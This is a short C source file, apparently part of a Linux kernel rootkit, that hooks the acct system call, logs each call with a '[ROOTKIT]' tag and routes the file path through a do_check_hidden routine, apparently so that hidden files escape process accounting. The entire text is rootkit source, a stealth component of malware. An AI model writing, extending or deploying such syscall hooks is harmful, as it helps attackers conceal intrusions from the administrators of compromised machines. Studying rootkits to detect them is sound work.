#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_acct syscall hook handler
SYSCALL_HOOK_HANDLER1(acct, orig_acct, p_regs, const char __user *, s_name)
{
    pr_info("[ROOTKIT] acct(%p)\n", s_name);

    if (s_name == NULL) {
        return orig_acct(p_regs);
    }

    return do_check_hidden(orig_acct, p_regs, AT_FDCWD, s_name, 0);
}
